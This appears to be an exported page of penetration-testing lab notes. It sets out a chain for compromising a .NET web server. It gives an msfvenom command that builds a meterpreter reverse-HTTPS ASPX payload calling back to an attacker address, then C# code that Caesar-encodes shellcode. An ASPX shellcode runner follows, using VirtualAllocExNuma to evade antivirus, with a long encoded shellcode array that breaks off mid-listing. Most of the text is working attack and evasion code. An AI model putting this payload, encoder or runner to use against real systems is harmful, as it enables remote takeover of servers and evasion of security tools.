<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>17-Combining all the pieces</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>17-Combining all the pieces</h1><br/><p><h2>Recon</h2><ul><li>sudo nmap -A -Pn 192.168.175.130-132 -oN nmap/allhosts -vvv</li><li>whatweb $url =&gt; dotnet =&gt; create dummy dotnet file with aspx extension</li><li>feroxbuster -u $url </li><li>sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.226 LPORT=443 -f aspx -o ./met.aspx</li><li>when upload the client doesn&#39;t send it </li><li>received a shell</li><li>if doesn&#39;t work procede with encrypting (ceasar)and decrypting plus </li><li>adding virtualallocexnuma </li></ul></p><p># encryption routine ceaser key 5</p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">namespace</span> Helper<br />{<br />    <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#7f0044;font-weight:400">byte</span>[] buf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">752</span>] {<br />                <span style="color:#ff0044;font-weight:400">0xfc</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,0xf0...<br />                <br />            <span style="color:#7f0044;font-weight:400">byte</span>[] encoded = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[buf.Length];<br />            <span style="color:#ff9d00;font-weight:700">for</span>(<span style="color:#7f0044;font-weight:400">int</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; buf.Length; i++)<br />            {<br />                encoded[i] = (<span style="color:#7f0044;font-weight:400">byte</span>)(((<span style="color:#7f0044;font-weight:400">uint</span>)buf[i] + <span style="color:#ff0044;font-weight:400">5</span>) &amp; <span style="color:#ff0044;font-weight:400">0xFF</span>);<br />            }<br />            <br />        }<br />        StringBuilder hex = <span style="color:#ff9d00;font-weight:700">new</span> StringBuilder(encoded.Length * <span style="color:#ff0044;font-weight:400">2</span>);<br />            <span style="color:#ff9d00;font-weight:700">foreach</span>(<span style="color:#7f0044;font-weight:400">byte</span> b <span style="color:#ff9d00;font-weight:700">in</span> encoded)<br />            {<br />                hex.AppendFormat(<span style="color:#3ad900;font-weight:400">&quot;0x{0:x2}, &quot;</span>, b);<br />            }<br /><br />Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;The payload is: &quot;</span> + hex.ToString());<br />     }<br />   }<br /> }</pre></div></p><p></p><p>decryption aspx the same key should be delt </p><p>aspx shell runner </p><p><div class="codebox"><pre>&lt;%@ Page Language=<span style="color:#3ad900;font-weight:400">&quot;C#&quot;</span> AutoEventWireup=<span style="color:#3ad900;font-weight:400">&quot;true&quot;</span> %&gt;<br />&lt;%@ Import Namespace=<span style="color:#3ad900;font-weight:400">&quot;System.IO&quot;</span> %&gt;<br />&lt;script runat=<span style="color:#3ad900;font-weight:400">&quot;server&quot;</span>&gt;<br />    <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">static</span> Int32 MEM_COMMIT=<span style="color:#ff0044;font-weight:400">0x1000</span>;<br />    <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">static</span> IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)<span style="color:#ff0044;font-weight:400">0x40</span>;<br /><br />    [System.Runtime.InteropServices.DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br />    <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);<br /><br />    [System.Runtime.InteropServices.DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br />    <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,<span style="color:#ff9d00;font-weight:700">ref</span> IntPtr lpThreadId);<br />    [System.Runtime.InteropServices.DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />    <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, <span style="color:#7f0044;font-weight:400">uint</span> dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);<br /><br />    [System.Runtime.InteropServices.DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />    <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetCurrentProcess();<br />    <span style="color:#ff9d00;font-weight:700">protected</span> <span style="color:#ff9d00;font-weight:700">void</span> Page_Load(<span style="color:#7f0044;font-weight:400">object</span> sender, EventArgs e)<br />    {<br />        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0x3000</span>, <span style="color:#ff0044;font-weight:400">0x4</span>, <span style="color:#ff0044;font-weight:400">0</span>);<br />        <span style="color:#ff9d00;font-weight:700">if</span>(mem == <span style="color:#ff0044;font-weight:700">null</span>)<br />        {<br />            <span style="color:#ff9d00;font-weight:700">return</span>;<br />        }<br />        <span style="color:#7f0044;font-weight:400">byte</span>[] anQJWGtXVfgE = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">623</span>] {<span style="color:#ff0044;font-weight:400">0xfe</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x85</span>, <span style="color:#ff0044;font-weight:400">0xe6</span>, <span style="color:#ff0044;font-weight:400">0xf2</span>, <span style="color:#ff0044;font-weight:400">0xea</span>, <span style="color:#ff0044;font-weight:400">0xce</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x53</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x52</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x53</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xd4</span>, <span style="color:#ff0044;font-weight:400">0x58</span>, <span style="color:#ff0044;font-weight:400">0x67</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x62</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x1a</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x22</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x11</span>, <span style="color:#ff0044;font-weight:400">0xb9</span>, <span style="color:#ff0044;font-weight:400">0x4c</span>, <span style="color:#ff0044;font-weight:400">0x4c</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x74</span>, <span style="color:#ff0044;font-weight:400">0x52</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0xae</span>, <span style="color:#ff0044;font-weight:400">0x3e</span>, <span style="color:#ff0044;font-weight:400">0x63</span>, <span style="color:#ff0044;font-weight:400">0x7e</span>, <span style="color:#ff0044;font-weight:400">0x04</span>, <span style="color:#ff0044;font-weight:400">0x2e</span>, <span style="color:#ff0044;font-weight:400">0x22</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x0f</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0xe4</span>, <span style="color:#ff0044;font-weight:400">0xef</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x53</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x22</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x44</span>, <span style="color:#ff0044;font-weight:400">0x3e</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xd2</span>, <span style="color:#ff0044;font-weight:400">0x68</span>, <span style="color:#ff0044;font-weight:400">0x83</span>, <span style="color:#ff0044;font-weight:400">0x7a</span>, <span style="color:#ff0044;font-weight:400">0x1a</span>, <span style="color:#ff0044;font-weight:400">0x0d</span>, <span style="color:#ff0044;font-weight:400">0x04</span>, <span style="color:#ff0044;font-weight:400">0x11</span>, <span style="color:#ff0044;font-weight:400">0x87</span>, <span style="color:#ff0044;font-weight:400">0x74</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x82</span>, <span style="color:#ff0044;font-weight:400">0x8a</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x87</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x76</span>, <span style="color:#ff0044;font-weight:400">0x69</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xd2</span>, <span style="color:#ff0044;font-weight:400">0x46</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x42</span>, <span style="color:#ff0044;font-weight:400">0x22</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x1a</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xd2</span>, <span style="color:#ff0044;font-weight:400">0x52</span>, <span style="color:#ff0044;font-weight:400">0xe5</span>, <span style="color:#ff0044;font-weight:400">0x58</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x36</span>, <span style="color:#ff0044;font-weight:400">0x8a</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xd8</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x0f</span>, <span style="color:#ff0044;font-weight:400">0xae</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0xe2</span>, <span style="color:#ff0044;font-weight:400">0x77</span>, <span style="color:#ff0044;font-weight:400">0xf3</span>, <span style="color:#ff0044;font-weight:400">0x4e</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x4e</span>, <span style="color:#ff0044;font-weight:400">0x26</span>, <span style="color:#ff0044;font-weight:400">0x0a</span>, <span style="color:#ff0044;font-weight:400">0x47</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0xd3</span>, <span style="color:#ff0044;font-weight:400">0x77</span>, <span style="color:#ff0044;font-weight:400">0xda</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0x46</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x42</span>, <span style="color:#ff0044;font-weight:400">0x26</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xd2</span>, <span style="color:#ff0044;font-weight:400">0x68</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x0e</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x46</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x42</span>, <span style="color:#ff0044;font-weight:400">0x1e</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xd2</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x06</span>, <span style="color:#ff0044;font-weight:400">0x8a</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xd2</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0x60</span>, <span style="color:#ff0044;font-weight:400">0x5b</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x5b</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x85</span>, <span style="color:#ff0044;font-weight:400">0xee</span>, <span style="color:#ff0044;font-weight:400">0x22</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xe2</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x5b</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x14</span>, <span style="color:#ff0044;font-weight:400">0xeb</span>, <span style="color:#ff0044;font-weight:400">0x4d</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0x5f</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xdd</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xc0</span>, <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x6b</span>, <span style="color:#ff0044;font-weight:400">0x70</span>, <span style="color:#ff0044;font-weight:400">0x6b</span>, <span style="color:#ff0044;font-weight:400">0x70</span>, <span style="color:#ff0044;font-weight:400">0x67</span>, <span style="color:#ff0044;font-weight:400">0x76</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x58</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xe3</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc4</span>, <span style="color:#ff0044;font-weight:400">0x4e</span>, <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x28</span>, <span style="color:#ff0044;font-weight:400">0x09</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xe3</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xbc</span>, <span style="color:#ff0044;font-weight:400">0x3c</span>, <span style="color:#ff0044;font-weight:400">0x58</span>, <span style="color:#ff0044;font-weight:400">0x7b</span>, <span style="color:#ff0044;font-weight:400">0xa9</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0xea</span>, <span style="color:#ff0044;font-weight:400">0x11</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0x34</span>, <span style="color:#ff0044;font-weight:400">0x30</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0x38</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0x30</span>, <span style="color:#ff0044;font-weight:400">0x36</span>, <span style="color:#ff0044;font-weight:400">0x37</span>, <span style="color:#ff0044;font-weight:400">0x30</span>, <span style="color:#ff0044;font-weight:400">0x34</span>, <span style="color:#ff0044;font-weight:400">0x34</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0xbd</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x6c</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xbc</span>, <span style="color:#ff0044;font-weight:400">0x59</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xa1</span>, <span style="color:#ff0044;font-weight:400">0xc8</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0xea</span>, <span style="color:#ff0044;font-weight:400">0x47</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x31</span>, <span style="color:#ff0044;font-weight:400">0x67</span>, <span style="color:#ff0044;font-weight:400">0x47</span>, <span style="color:#ff0044;font-weight:400">0x50</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x70</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0x63</span>, <span style="color:#ff0044;font-weight:400">0x6d</span>, <span style="color:#ff0044;font-weight:400">0x69</span>, <span style="color:#ff0044;font-weight:400">0x44</span>, <span style="color:#ff0044;font-weight:400">0x74</span>, <span style="color:#ff0044;font-weight:400">0x63</span>, <span style="color:#ff0044;font-weight:400">0x72</span>, <span style="color:#ff0044;font-weight:400">0x50</span>, <span style="color:#ff0044;font-weight:400">0x77</span>, <span style="color:#ff0044;font-weight:400">0x6f</span>, <span style="color:#ff0044;font-weight:400">0x78</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0x64</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x6c</span>, <span style="color:#ff0044;font-weight:400">0x7a</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x32</span>, <span style="color:#ff0044;font-weight:400">0x69</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0x59</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0x72</span>, <span style="color:#ff0044;font-weight:400">0x70</span>, <span style="color:#ff0044;font-weight:400">0x36</span>, <span style="color:#ff0044;font-weight:400">0x39</span>, <span style="color:#ff0044;font-weight:400">0x61</span>, <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0x68</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x52</span>, <span style="color:#ff0044;font-weight:400">0x51</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x59</span>, <span style="color:#ff0044;font-weight:400">0x4d</span>, <span style="color:#ff0044;font-weight:400">0x58</span>, <span style="color:#ff0044;font-weight:400">0x74</span>, <span style="color:#ff0044;font-weight:400">0x7b</span>, <span style="color:#ff0044;font-weight:400">0x74</span>, <span style="color:#ff0044;font-weight:400">0x69</span>, <span style="color:#ff0044;font-weight:400">0x46</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x65</span>, <span style="color:#ff0044;font-weight:400">0x4c</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0x59</span>, <span style="color:#ff0044;font-weight:400">0x34</span>, <span style="color:#ff0044;font-weight:400">0x6b</span>, <span style="color:#ff0044;font-weight:400">0x70</span>, <span style="color:#ff0044;font-weight:400">0x51</span>, <span style="color:#ff0044;font-weight:400">0x58</span>, <span style="color:#ff0044;font-weight:400">0x47</span>, <span style="color:#ff0044;font-weight:400">0x44</span>, <span style="color:#ff0044;font-weight:400">0x6c</span>, <span style="color:#ff0044;font-weight:400">0x6e</span>, <span style="color:#ff0044;font-weight:400">0x69</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0xba</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x34</span>, <span style="color:#ff0044;font-weight:400">0xaa</span>, <span style="color:#ff0044;font-weight:400">0x86</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x52</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc4</span>, <span style="color:#ff0044;font-weight:400">0xed</span>, <span style="color:#ff0044;font-weight:400">0x57</span>, <span style="color:#ff0044;font-weight:400">0x30</span>, <span style="color:#ff0044;font-weight:400">0x3d</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xc8</span>, <span style="color:#ff0044;font-weight:400">0x6c</span>, <span style="color:#ff0044;font-weight:400">0x0c</span>, <span style="color:#ff0044;font-weight:400">0x61</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xf3</span>, <span style="color:#ff0044;font-weight:400">0x6c</span>, <span style="color:#ff0044;font-weight:400">0x21</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x54</span>, <span style="color:#ff0044;font-weight:400">0x6a</span>, <span style="color:#ff0044;font-weight:400">0x82</span>, <span style="color:#ff0044;font-weight:400">0x35</span>, <span 